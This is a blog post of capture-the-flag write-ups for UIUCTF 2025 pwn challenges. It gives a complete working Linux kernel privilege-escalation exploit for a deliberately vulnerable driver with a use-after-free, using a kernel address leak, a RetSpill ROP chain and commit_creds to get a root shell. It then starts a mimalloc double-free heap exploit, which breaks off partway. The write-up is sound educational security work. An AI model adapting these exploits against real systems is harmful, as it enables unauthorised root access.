+++
date = '2025-07-30'
draft = false
title = 'UIUCTF 2025'
author = '0xM4hm0ud'
tags = ['PWN', 'kernel', 'Use-After-Free', 'telefork', 'retspill', 'KROP', 'mimalloc', 'UEFI', 'Lua', 'Secure Boot', 'EDK2']
summary = 'Writeups of the pwn challenges from UIUCTF 2025'
+++

Original writeup can be read [here](https://0xm4hm0ud.me/posts/uiuctf-2025)

# Baby Kernel

|||
|-|-|
|  **CTF**  |  [UIUCTF](https://2025.uiuc.tf/) [(CTFtime)](https://ctftime.org/event/2640)  |
|  **Author** |  nikhil |
|  **Category** |  Pwn |
|  **Solves** |  52  |

![img](/images/babykernel.png)

## Challenge analysis

We can download the handout and see that it contains a few files:

![img](/images/kernelhandout.png)

The files explained:

- `bzImage` is the kernel image. 
- `initrd.cpio.gz` is the initramfs file system. 
- `run.sh` is a script used to run the kernel with [QEMU](https://www.qemu.org/). 
- `vuln.c` is the source code of the vulnerable driver
- `vuln.ko` is the compiled version of the vulnerable driver

Let's take a look at the vulnerable driver:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/uaccess.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = handle_ioctl,
};

struct miscdevice vuln_dev ={
    .minor = MISC_DYNAMIC_MINOR,
    .name = "vuln",
    .fops = &fops, 
};

void* buf = NULL;
size_t size = 0;

long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case ALLOC: {
            if (buf) {
                return -EFAULT;
            }
            ssize_t n =  copy_from_user(&size, (void*)arg, sizeof(size_t));
            if (n != 0) {
                return n;
            }
            buf = kzalloc(size, GFP_KERNEL);
            return 0;
        };
        case FREE: {
            if (!buf) {
                return -EFAULT;
            }
            kfree(buf);
            break;
        }
        case USE_READ: {
            if (!buf) {
                return -EFAULT;
            }
            return copy_to_user((char*)arg, buf, size);
        }

        case USE_WRITE: {
            if (!buf) {
                return -EFAULT;
            }
            return copy_from_user(buf, (char*)arg, size);
        }

        default: {
            break;
        }

    }
    return 0;
}

int32_t vuln_init(void) {
    int ret;
    
    ret = misc_register(&vuln_dev);
    if (ret) {
        printk(KERN_ERR "Failed to register device\n");
        return ret;
    }
    return 0;
}

void vuln_exit(void) {
    misc_deregister(&vuln_dev);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("UIUCTF Inc.");
MODULE_DESCRIPTION("Vulnerable Kernel Module");  
module_init(vuln_init);
module_exit(vuln_exit);
```

We can see that an `ioctl` handler is registered. Inside the handler, we can use four different commands: `ALLOC`, `FREE`, `USE_READ`, and `USE_WRITE`.

- `ALLOC` copies a size value from the user and stores it in the size variable. It then allocates memory using kzalloc with the specified size and stores the resulting pointer in the buf variable.
- `FREE` frees the memory pointed to by buf.
- `USE_READ` reads data from the buffer at buf with the specified size and copies it to user space.
- `USE_WRITE` writes data from user space into the buffer pointed to by buf.

However, we can see that after the buffer is freed with `FREE`, the buf pointer is not set to `NULL`. This means we can still access it using the other commands (`USE_READ` or `USE_WRITE`) after it has been freed. This results in a **Use-After-Free (UAF)** vulnerability.

Additionally, the module allows us to allocate memory of **any size**.

Let's take a look at the run script:

```sh
#! /bin/sh

# Note: -serial mon:stdio is here for convenience purposes.
# Remotely the chal is run with -serial stdio.

qemu-system-x86_64 \
  -no-reboot \
  -cpu max \
  -net none \
  -serial mon:stdio \
  -display none \
  -monitor none \
  -vga none \
  -kernel bzImage \
  -initrd initrd.cpio.gz \
  -append "console=ttyS0"
```

This invokes QEMU with our kernel image and initramfs. The `-cpu max` option enables all supported CPU features—meaning SMEP, SMAP, KPTI, and any others your host CPU offers are turned on.

We can check the `init` file after extracting the initramfs file system:

```sh
#!/bin/sh

mkdir -p /proc /sys /tmp

mount -t devtmpfs devtmpfs /dev
mkdir /dev/pts
mount -t devpts none /dev/pts
mount -t proc none /proc
mount -t sysfs none /sys
mount -t tmpfs none /tmp

mkdir /mnt
if mount -t 9p -o trans=virtio flag /mnt; then
    cp /mnt/flag.txt /flag.txt
    umount /mnt
else
    echo 'uiuctf{test_flag}' > /flag.txt
fi

chown 0:0 /flag.txt
chmod 0400 flag.txt

cat <<!

Welcome to baby-kernel!
Boot took $(cut -d' ' -f1 /proc/uptime) seconds

!

insmod vuln.ko
chmod 0666 /dev/vuln

exec setsid cttyhack setuidgid 1000 /bin/sh 0<>"/dev/ttyS0" 1>&0 2>&0
```

We can see that the script mounts the flag. If the flag is not available, it writes a placeholder (`uiuctf{test_flag}`) to flag.txt.
The vulnerable kernel module is loaded using `insmod`. The script then spawns `/bin/sh` as user ID 1000. For debugging purposes, we can change this to UID 0 to get a root shell.

## Setup

Before we dive into exploitation, we need a setup for debugging. The environment I use includes a few helper scripts.

### decompile.sh
This script extracts the contents of the initramfs into a folder:

```sh
#!/bin/bash

# Decompress a .cpio.gz packed file system
mkdir initramfs
pushd . && pushd initramfs
cp ../initrd.cpio.gz .
gzip -dc initrd.cpio.gz | cpio -idm &>/dev/null && rm initrd.cpio.gz
```

### compile.sh
This script compiles an exploit into the file system, recompiles the initramfs, and then launches QEMU.

```sh
#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk '{ print substr( $0, 1, length($0)-2 ) }')
gcc $in -static -masm=intel -o $out || exit 255
mv $out initramfs/
pushd . && pushd initramfs
find . -print0 | cpio --null --format=newc -o 2>/dev/null | gzip -9 > ../initrd.cpio.gz
popd

./run.sh
```

Note: I added the `-s` flag to the QEMU run script. This makes QEMU listen for an incoming GDB connection on TCP port 1234.

### gdbscript

I also created a GDB script to automatically connect and load symbols:

```py
python

gdb.execute("target remote localhost:1234")
gdb.execute("ks-apply")

_, name, base, _ = gdb.execute("kmod -q", to_string=True).split()
base = int(base, 16)

gdb.execute(f"add-symbol-file ./vuln.ko {base}")
gdb.execute(f"set $base={base}")

end
```

This connects to the QEMU instance on port 1234 and uses `ks-apply` and `kmod` to load kernel symbols. I use the [bata24 fork of GEF](https://github.com/bata24/gef), which provides helpful kernel debugging extensions.

### usage

When I run the script like this:
```
./compile.sh exploit.c
```
It compiles the exploit, rebuilds the initramfs, and launches QEMU.

Then, in a new terminal, I run:
```
gdb -x gdbscript
```
This automatically connects GDB to the QEMU kernel instance and loads the symbols—ready for debugging.

## Exploitation

This challenge can be solved in multiple ways, primarily because we are allowed to allocate memory of **any size**. This opens up several exploitation techniques.

### Author's solution

The author’s solution uses the `tty_struct` object. This structure contains a pointer named [ops](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty.h#L199), which points to a `tty_operations` structure. That structure, in turn, includes a pointer for [ioctl](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty_driver.h#L364). 

When you call `ioctl()` on `/dev/ptmx`, the kernel invokes the `tty_ioctl()` function. Inside that function, it eventually executes the following [line](https://elixir.bootlin.com/linux/v6.6.16/source/drivers/tty/tty_io.c#L2779):
```c
tty->ops->ioctl(tty, cmd, arg);
```

This means that if you can overwrite the `ioctl` pointer inside the `tty_operations` structure, you gain code execution.

This technique can be used to achieve **arbitrary address write (AAW)**, as explained in this [reference](https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md#aaw-simplified-version-of-rip-control). With this primitive, it's possible to overwrite the `modprobe_path` variable in the kernel to trigger custom script execution and ultimately leak the flag.

### My solution

#### Target object

I used the [seq_operations](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/seq_file.h#L32) object as the target for exploitation.

```c
struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
```

This structure contains four function pointers, which are perfect targets for hijacking control flow.

You can trigger the allocation of a `seq_operations` object by simply opening a `/proc` stat file:

```c
open("/proc/self/stat", O_RDONLY);
```

This causes the kernel to call [single_open](https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L572), which allocates and initializes a `seq_operations` structure with function pointers:

```c
int single_open(struct file *file, int (*show)(struct seq_file *, void *),
		void *data)
{
	struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);
	int res = -ENOMEM;

	if (op) {
		op->start = single_start;
		op->next = single_next;
		op->stop = single_stop;
		op->show = show;
		res = seq_open(file, op);
		if (!res)
			((struct seq_file *)file->private_data)->private = data;
		else
			kfree(op);
	}
	return res;
}
```

Once the file is opened, calling `read()` on the file descriptor will eventually invoke [`seq_read()`](https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L151):


```c
ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
	struct iovec iov = { .iov_base = buf, .iov_len = size};
	struct kiocb kiocb;
	struct iov_iter iter;
	ssize_t ret;

	init_sync_kiocb(&kiocb, file);
	iov_iter_init(&iter, ITER_DEST, &iov, 1, size);

	kiocb.ki_pos = *ppos;
	ret = seq_read_iter(&kiocb, &iter);
	*ppos = kiocb.ki_pos;
	return ret;
}
```

This function will call `seq_read_iter`. Inside `seq_read_iter`, the following [line](https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L225) is called:

```c
p = m->op->start(m, &m->index);
```

This means that if you can overwrite the `start` function pointer in the `seq_operations` structure, you gain code execution when `read()` is called on that file descriptor.

#### UAF

To trigger the Use-After-Free (UAF) on the target object, we first allocate a chunk of memory using the vulnerable driver with the same size as the object we want to target. Then, we free it and immediately allocate the target object (`seq_operations`) so that it occupies the same memory region.

I created a few helper functions to interact with the driver's `ioctl` interface:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ALLOC 0x4008b900
#define FREE 0xb901
#define USE_READ 0x8001b902
#define USE_WRITE 0x4001b902

int driver_fd;

int open_dev(char *path) {
  printf("Opening device\n");
  int fd = open(path, O_RDWR);

  if (fd == -1) {
    printf("Failed to open device\n");
    return 2;
  } else {
    printf("Opened device\n");
  }

  return fd;
}

int kfree() { 
    ioctl(driver_fd, FREE, NULL); 
}

int kread(char *buf) {
  ioctl(driver_fd, USE_READ, buf);
  return 0;
}

int kalloc(size_t size) {
  int val = 0;
  printf("Allocating kernel buffer\n");
  val = ioctl(driver_fd, ALLOC, &size);
  printf("val = %d\n", val);
  if (val < 0) {
    printf("Failed to allocate memory : 0x%08x\n", val);
  }
  return val;
}
```

Now in `main()`:

```c
int main(int argc, char *argv[]) {
    driver_fd = open_dev("/dev/vuln");

    kalloc(0x20);
    kfree();

    int fd = open("/proc/self/stat", O_RDONLY);
}
```

Here’s what happens:
- We first open the device.
- Then allocate a 0x20-sized chunk (matching seq_operations).
- Free it.
- Immediately open /proc/self/stat, which internally allocates a seq_operations object of the same size.

If we set a breakpoint at `kfree()` and inspect the rdi register in GDB, we can see the memory location of the freed object:

![img](/images/kfree.png)

At this point, the memory is zeroed due to `kzalloc`. But after continuing and re-checking the same address, we now see the seq_operations structure:

![img](/images/seq.png)

#### Leaks

With UAF in place, we can now leak data from the seq_operations structure using `USE_READ`. Since this structure contains function pointers, we can use a known offset to calculate the kernel base address.

Using GDB and the `xinfo` command, we can determine the offset to the base:

![img](/images/xinfo.png)

Here’s the leak logic in code:
```c
int main(int argc, char *argv[]) {
    driver_fd = open_dev("/dev/vuln");
    char buf[100] = {0};

    kalloc(0x20);
    kfree();

    int fd = open("/proc/self/stat", O_RDONLY);

    kread(buf);
    uint64_t start_ptr = *(uint64_t *)buf;
    uint64_t kbase = start_ptr - 0x2ba4b0;

    printf("[+] Leaked start pointer: %#lx\n", start_ptr);
    printf("[+] Kernel base: %#lx\n", kbase);
}
```
![img](/images/leaks.png)

#### RIP control

Now that we have both an information leak and a UAF primitive, we can overwrite the start function pointer in the seq_operations structure and gain control over RIP when `read()` is called.

```c
  char payload[8] = {0};
  memset(payload, 'A', 8);
  ioctl(driver_fd, USE_WRITE, payload);
  read(fd, 0, 1);
```
To catch this in GDB, I added this to the end of the gdbscript:

```
b *seq_read_iter+226
c
```

This breakpoint hits just before the call to the start function:
![img](/images/breakpoint.png)

Using `si` to step in:

![img](/images/overflow.png)

As expected, the CPU attempts to jump to the fake function pointer (`'A'*8`), confirming full RIP control.

Now that we have:
- A kernel base leak
- RIP control

We’re ready to build a full ROP chain and gain code execution in kernel space.

#### ROP chain

For the ROP chain, we can use `commit_creds(init_cred)` to elevate our process to root. After that, we need to return to userland. When protections are disabled, we can place shellcode in userland and use an `xchg` gadget on `rsp` to pivot to a userland address. However, in this case, that's not possible. There's also another problem—we don't have much space for our shellcode. We can overwrite the four function pointers, but they're not placed nicely on the stack. So, what can we do?

There is a technique called [RetSpill](https://github.com/sefcom/RetSpill). With this technique we can put data on the kernel stack. This is useful for kernel ROP chains where direct control over the stack is limited. As explained in the [paper](https://dl.acm.org/doi/pdf/10.1145/3576915.3623220):

> Preserved Registers. Each user space thread has its own kernel
stack. When the user space thread invokes a system call, the kernel
will switch to using the associated kernel stack by setting the rsp
register. Immediately following the stack pointer change, the kernel
pushes the user space context onto the kernel stack to preserve
the context as shown in Figure 1. Here, the “user space context” is
a data structure called pt_regs [65] that includes all of the user
space registers. These values can be carefully set by malicious users
before invoking the system call.
In other words, a fully user-controllable region is at the bottom
of the kernel stack. When the attacker triggers a CFHP, they can
use the controlled pt_regs region as a ROP payload.

We can use the following code to observe which data from which register is spilled onto the kernel stack. After the assembly stub, we trigger a syscall by performing a `read()` on the seq file.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ALLOC 0x4008b900
#define FREE 0xb901
#define USE_READ 0x8001b902
#define USE_WRITE 0x4001b902

uint64_t kbase = 0;

int driver_fd;
int open_dev(char *path) {
  printf("Opening device\n");
  int fd = open(path, O_RDWR);
  if (fd == -1) {
    printf("Failed to open device\n");
    return 2;
  } else {
    printf("Opened device\n");
  }
  return fd;
}

int kfree() { 
    ioctl(driver_fd, FREE, NULL); 
}

int kread(char *buf) {
  ioctl(driver_fd, USE_READ, buf);
  return 0;
}

int kalloc(size_t size) {
  int val = 0;
  printf("Allocating kernel buffer\n");
  val = ioctl(driver_fd, ALLOC, &size);
  printf("val = %d\n", val);
  if (val < 0) {
    printf("Failed to allocate memory : 0x%08x\n", val);
  }
  return val;
}

static inline void set_pt_regs() {
    asm volatile(
        ".intel_syntax noprefix;"

        "mov rcx, 0x4141414141414141;"
        "mov rdi, 0x4141414141414142;"
        "mov rdx, 0x4141414141414143;"        
        "mov rsi, 0x4141414141414144;"
        "mov rbp, 0x4141414141414145;"

        "mov r15, 0x4141414141414146;"
        "mov r14, 0x4141414141414147;"
        "mov r13, 0x4141414141414148;"
        "mov r12, 0x4141414141414149;"
        "mov r10, 0x414141414141414a;"
        "mov r9,  0x414141414141414b;"
        "mov r8,  0x414141414141414c;"
    );
}

int main(int argc, char *argv[]) {
    driver_fd = open_dev("/dev/vuln");
    char buf[100] = {0};

    kalloc(0x20);
    kfree();

    int fd = open("/proc/self/stat", O_RDONLY);

    kread(buf);
    uint64_t start_ptr = *(uint64_t *)buf;
    kbase = start_ptr - 0x2ba4b0;

    printf("[+] Leaked start pointer: %#lx\n", start_ptr);
    printf("[+] Kernel base: %#lx\n", kbase);

    char payload[8] = {0};
    memset(payload, 'A', 8);

    ioctl(driver_fd, USE_WRITE, payload);
    set_pt_regs();
    read(fd, 0, 1);
}
```

If we inspect the kernel stack at the time of the crash, we can see our controlled data at the bottom:

![img](/images/retspill.png)

We observe that the values from registers `r15`, `r14`, `r13`, and `r12` are adjacent, followed—after 24 bytes—by data from `r10`, `r9`, and `r8`. This gives us seven registers where we can place controlled gadget addresses.

Importantly, this data appears at the **bottom of the kernel stack**, so we need a gadget in the start function that adjusts the stack to point to our first gadget (e.g., in r15):

![img](/images/offsetr15.png)

This means we’re looking for a gadget like:
```
ret 0x1e8
```
This shifts the rsp forward to where our ROP chain begins. 

We still don’t have a clean way to return to userland using traditional methods, due to protections and limited space. Instead, I used a technique called [`telefork`](https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork), which allows us to "teleport" back to userland using a combination of `fork` and `msleep`.

In this challenge, due to the layout and perhaps unintended side effects, the stack ended up executing the `fork` gadget twice instead of calling `msleep`, but the approach still worked.

Before the ret gadget executes, the stack looks like this:
![img](/images/beforeret.png)

After the gadget, control is transferred to our crafted ROP chain using the spilled register values as the entry point:

![img](/images/afterret.png)

The issue now is that after the `start()` function returns in `seq_read_iter`, execution simply continues within the function. Fortunately, there's another opportunity to regain control—right after the `start()` call, the kernel also invokes the [`stop()`](https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L572) function:

```c
m->op->stop(m, p);
```

Since we control the entire `seq_operations` structure, we also control the stop function pointer. This gives us a second controlled jump, right after `start()` is called.

To make this work, I placed a `pop rdi; ret` gadget in the stop pointer. This is important because before calling `stop()`, the kernel pushes the return address onto the stack. When `stop()` is called, our `pop rdi` gadget removes that return address, allowing the next ret to go directly to our first gadget—placed at the value of `r15` in the spilled stack.

Here’s what that looks like in GDB, right before hitting our first gadget:

![img](/images/firstgadget.png)

With full control over RIP and the stack now properly aligned to our spilled values, the ROP chain looks like this:

```
pop rdi; ret
init_cred
commit_creds
fork
msleep
```

At this stage, I encountered another issue: after placing `init_cred` into `rdi` and calling `commit_creds`, the function returns to the last gadget before the gap—causing a crash.

This is because there's a 24-byte gap between the values spilled into `r12` and `r10`, meaning the return path lands somewhere else.

To resolve this, instead of calling `commit_creds` directly after setting `rdi`, I inserted an extra `ret 0x18` gadget. This advances the stack by 0x18 bytes, skipping over the gap and correctly aligning the next return address.

Here’s how the stack looks right before the `ret 0x18` gadget is executed:

![img](/images/beforeret18.png)

The extra 8 bytes come from the ret instruction itself. After the stack is adjusted, we then jump to `commit_creds(init_cred)`, followed by `fork`.

For some reason, the fork gadget appears twice in the final chain instead of once followed by msleep, but it still worked as expected.

![img](/images/finalchain.png)

The final exploit:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ALLOC 0x4008b900
#define FREE 0xb901
#define USE_READ 0x8001b902
#define USE_WRITE 0x4001b902

#define KADDR(x) kbase+(x-0xffffffffa2e00000)

#define INIT_CRED      KADDR(0xffffffffa4852fc0) 
#define COMMIT_CREDS   KADDR(0xffffffffa2eb9970)
#define POP_RDI        KADDR(0xffffffffa2e4b80d)
#define RET_1E0h       KADDR(0xffffffffa350ed2b)
#define RET_18h        KADDR(0xffffffffa2f2ef8a)
#define RET            KADDR(0xffffffffa2e00426)
#define MSLEEP         KADDR(0xffffffffa2f34bc0)
#define SYS_FORK       KADDR(0xffffffffa2e84ce0)

uint64_t kbase = 0;

void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

int driver_fd;
int open_dev(char *path) {
  printf("Opening device\n");
  int fd = open(path, O_RDWR);

  if (fd == -1) {
    printf("Failed to open device\n");
    return 2;
  } else {
    printf("Opened device\n");
  }

  return fd;
}

int kfree() { 
    ioctl(driver_fd, FREE, NULL); 
}

int kread(char *buf) {
  ioctl(driver_fd, USE_READ, buf);
  return 0;
}

int kalloc(size_t size) {
  int val = 0;
  printf("Allocating kernel buffer\n");
  val = ioctl(driver_fd, ALLOC, &size);
  printf("val = %d\n", val);
  if (val < 0) {
    printf("Failed to allocate memory : 0x%08x\n", val);
  }
  return val;
}

static inline void set_pt_regs() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov r15, %[pop_rdi];"
        "mov r14, %[init_cred];"
        "mov r13, %[ret_18];"
        "mov r12, %[ret];"
        "mov r10, %[commit_creds];"
        "mov r9,  %[fork];\n"
        "mov r8,  %[msleep];\n"
        :
        :  [pop_rdi] "r" (POP_RDI), [init_cred] "r" (INIT_CRED), [ret_18] "r" (RET_18h), [ret] "r" (RET), [commit_creds] "r" (COMMIT_CREDS), [fork] "r" (SYS_FORK), [msleep] "r" (MSLEEP)
    );
}

int main(int argc, char *argv[]) {
    driver_fd = open_dev("/dev/vuln");
    char buf[100] = {0};

    kalloc(0x20);
    kfree();

    int fd = open("/proc/self/stat", O_RDONLY);

    kread(buf);
    uint64_t start_ptr = *(uint64_t *)buf;
    kbase = start_ptr - 0x2ba4b0;

    printf("[+] Leaked start pointer: %#lx\n", start_ptr);
    printf("[+] Kernel base: %#lx\n", kbase);
    printf("[+] commit_creds: %#lx\n", COMMIT_CREDS);
    printf("[+] init_cred: %#lx\n", INIT_CRED);
    printf("[+] fork: %#lx\n", SYS_FORK);
    printf("[+] msleep: %#lx\n", MSLEEP);

    uint64_t payload[4] = {
            RET_1E0h, // start()
            1, 
            2,
            POP_RDI, // stop()
    };

    ioctl(driver_fd, USE_WRITE, payload);
    set_pt_regs();
    asm volatile(
        "mov rdx, 0x20;"
        "mov rsi, rsp;"
            "mov edi, %[fd];"
            "xor rax, rax;"
        "syscall;"          // read syscall on the seq fd 
        :
        : [fd] "r" (fd)
    );
    if(getuid() == 0) get_shell(0);
}
```

When we run the exploit, we are able to open the flag file as the root user.
![img](/images/exploit.png)

# do re mi

|||
|-|-|
|  **CTF**  |  [UIUCTF](https://2025.uiuc.tf/) [(CTFtime)](https://ctftime.org/event/2640)  |
|  **Author** |  Surg |
|  **Category** |  Pwn |
|  **Solves** |  44  |

![img](/images/doremi.png)

## Challenge analysis

After downloading the handout, we can see a few files.

![img](/images/doremihandout.png)

One of the files is a library called `libmimalloc.so.2.2`. [mimalloc](https://github.com/microsoft/mimalloc)  is a general-purpose memory allocator developed by Microsoft. It is open source.

Let’s take a look at the Dockerfile:

```Dockerfile
FROM alpine AS build

RUN apk add build-base cmake git

RUN git clone https://github.com/microsoft/mimalloc.git /mimalloc -b v2.2.4 --depth=1

RUN mkdir -p /mimalloc/build
RUN cd /mimalloc/build && cmake -DCMAKE_BUILD_TYPE=Debug .. && make

COPY chal.c /chal.c
RUN gcc /chal.c -o /chal

FROM alpine AS chroot

RUN apk add bash

FROM gcr.io/kctf-docker/challenge@sha256:9f15314c26bd681a043557c9f136e7823414e9e662c08dde54d14a6bfd0b619f

COPY --from=chroot / /chroot
COPY --from=build /mimalloc/build/libmimalloc.so.2.2 /chal /chroot/home/user/
COPY flag /chroot/home/user/
COPY nsjail.cfg /home/user/

CMD kctf_setup && \
    kctf_drop_privs \
    socat TCP-LISTEN:1337,reuseaddr,fork \
        EXEC:'kctf_pow nsjail --config /home/user/nsjail.cfg --cwd /home/user -- /usr/bin/env LD_PRELOAD=/home/user/libmimalloc.so.2.2 /home/user/chal'
```

We can see that the challenge uses mimalloc version 2.2.4. It also copies a file named nsjail.cfg, which isn't included in the handout. However, we can find it from another CTF challenge or public repository.

Fortunately, the source code of the challenge is included, so we can start analyzing it directly.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>

void create();
void update();
void delete();
void look();
unsigned int get_index();


#define NOTE_COUNT 16
#define NOTE_SIZE  128

char * notes [NOTE_COUNT] = {0};

#define INTRO "\
###################################\n\
# Yet Another Heap Note Challenge #\n\
###################################\n\
    What Would You Like to Do:     \n\
        1. Create a Note           \n\
        2. Delete a Note           \n\
        3. Read a Note             \n\
        4. Update a Note           \n\
        5. Exit                    \n"
#define PMT "YAHNC> "

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf(INTRO);

    while (true) {
        unsigned int option;
        printf(PMT);
        if (scanf(" %u", &option) != 1){
            printf("Invalid Input.\n");
            exit(1);
        }
        if (option >= 6 || option == 0) {
            printf("Invalid Range.\n");
            exit(1);
        }

        switch(option) {
            case 1: 
                create();
                break;
            case 2: 
                delete();
                break;
            case 3:
                look();
                break;
            case 4:
                update();
                break;
            case 5:
                exit(0);
        }
    }
    return 0;
}

unsigned int get_index() {
    unsigned int number;
    printf("Position? (0-15): ");
    if (scanf(" %u", &number) != 1){
        printf("Invalid Input.\n");
        exit(1);
    }
    if (number >= 16) {
        printf("Invalid Range.\n");
        exit(1);
    }
    return number;
}

void create() {
    unsigned int number = get_index();
    notes[number] = malloc(128);
    printf("Done!\n");
    return;
}

void look() {
    unsigned int number = get_index();
    write(STDOUT_FILENO, notes[number], NOTE_SIZE-1);
    printf("\n");
    printf("Done!\n");
}

void delete() {
   unsigned int number = get_index();
   free(notes[number]);
   printf("Done!\n");
   return; 
}

void update() {
    unsigned int number = get_index();
    printf("Content? (127 max): ");
    read(STDIN_FILENO, notes[number], NOTE_SIZE-1);
    printf("Done!\n");
    return;
}
```
This is a standard heap challenge where you can create, delete, read, and edit chunks. Inside the `get_index` function, there’s a check to ensure that the index stays within the valid range of 0–15. However, there are no additional checks, which means we can reuse the same index multiple times.

There’s also a bug in the delete function: after freeing a chunk, the corresponding pointer is not set to `NULL`. This results in a Use-After-Free (UAF) vulnerability.

## Setup

For this challenge, I decided to run it using Docker, so I created a build script.
```sh
#!/usr/bin/bash 

docker build -t chall .
docker run --privileged -p 1337:1337 chall
```

My exploit template for this challenge is:

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw, ssl=False)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chal'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
libc = ELF("./libmimalloc.so.2.2", checksec=False)

sla = lambda delim, data: io.sendlineafter(delim, data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
r = lambda num=4096: io.recv(num)

def u32d(data): return u32(data.ljust(4, b'\x00'))
def u64d(data): return u64(data.ljust(8, b'\x00'))

io = start()

def create(position):
    sla(b'> ', b'1')
    sla(b': ', str(position))

def delete(position):
    sla(b'> ', b'2')
    sla(b': ', str(position))

def show(position):
    sla(b'> ', b'3')
    sla(b': ', str(position))

def edit(position, content):
    sla(b'> ', b'4')
    sla(b': ', str(position))
    sla(b': ', content)

io = start()

io.interactive()
```

```
python3 solve.py REMOTE 127.0.0.1 1337
```

I also created a GDB script similar to the one I used in the baby kernel challenge.
When running the container and my exploit script, I launch GDB with the following command:
```
sudo gdb -p $(pgrep -fxn /home/user/chal) -x gdbscript
```
## Exploitation

I first focused on how to get a leak.

When we allocate a chunk, a new section/page is created. The structure of the chunk looks like this:

![img](/images/chunk.png)

We can see that the chunk contains a pointer, which points to the next free chunk in the freelist. Using the [bata24](https://github.com/bata24/gef) of GEF, we can inspect the heap with the command `mimalloc-heap-dump`:

![img](/images/mimalloccmd.png)

This confirms that the pointer inside our chunk indeed references the next free chunk. Each chunk in the freelist has a similar pointer to the next available chunk. If we can overwrite this pointer, we can potentially allocate chunks at arbitrary memory addresses.

After deleting the chunk, the internal freelist pointer is removed:

![img](/images/free.png)

However, we still retain a reference to that chunk through the global `notes` array. If we delete the same chunk again (i.e., a double free), the chunk is added back to the freelist:

![img](/images/doublefree.png)

This allows us to read the freed chunk and leak its address. From there, we can calculate the offset to the start of the memory page and use it as part of our exploitation strategy.

```py
create(0)
edit(0, b'A' * 8 + b'B' * 8)
delete(0)
delete(0)
show(0)
leak = u64d(ru(b'B'*8)[:-8])
heap_base = leak - 0x10080
log.success("Heap leak: %#x", leak)
log.success("Heap base: %#x", heap_base)
```

Now that we’ve leaked the chunk address and calculated the base of the memory page, the next step is to leak the base address of the libmimalloc library. At the start of the page resides the [`mi_page_t`](https://github.com/microsoft/mimalloc/blob/v2.2.4/include/mimalloc/types.h#L320) structure. This struct contains several pointers, some of which reference thread-local storage (TLS) and internal structures within libmimalloc:

![img](/images/mimallocptr.png)

If we can allocate a chunk at the beginning of the page (where mi_page_t is located), we can read these internal pointers and leak addresses inside libmimalloc.

So how can we edit the freelist pointer to perform arbitrary chunk allocation? Can we simply allocate a chunk, free it, overwrite the freelist pointer, and allocate again?

Let’s take a closer look at the comments above the mi_page_t struct in the source code.

```
// A page contains blocks of one specific size (`block_size`).
// Each page has three list of free blocks:
// `free` for blocks that can be allocated,
// `local_free` for freed blocks that are not yet available to `mi_malloc`
// `thread_free` for freed blocks by other threads
// The `local_free` and `thread_free` lists are migrated to the `free` list
// when it is exhausted. The separate `local_free` list is necessary to
// implement a monotonic heartbeat. The `thread_free` list is needed for
// avoiding atomic operations in the common case.
```

We know that mimalloc maintains three distinct free lists: `free`, `local_free`, and `thread_free`. When a chunk is freed, it is initially placed into the local_free list. As a result, subsequent allocations won’t immediately return that recently freed chunk — instead, allocations are served from the free list:

![img](/images/freelist.png)

From the source code comments, we see: 
> The local_free and thread_free lists are migrated to the free list when it is exhausted.

This behavior gives us an idea: if we allocate and then immediately free a chunk repeatedly — enough times to exhaust the free list — all of those chunks from local_free will eventually be migrated back into the free list.

Here’s what that looks like in practice:

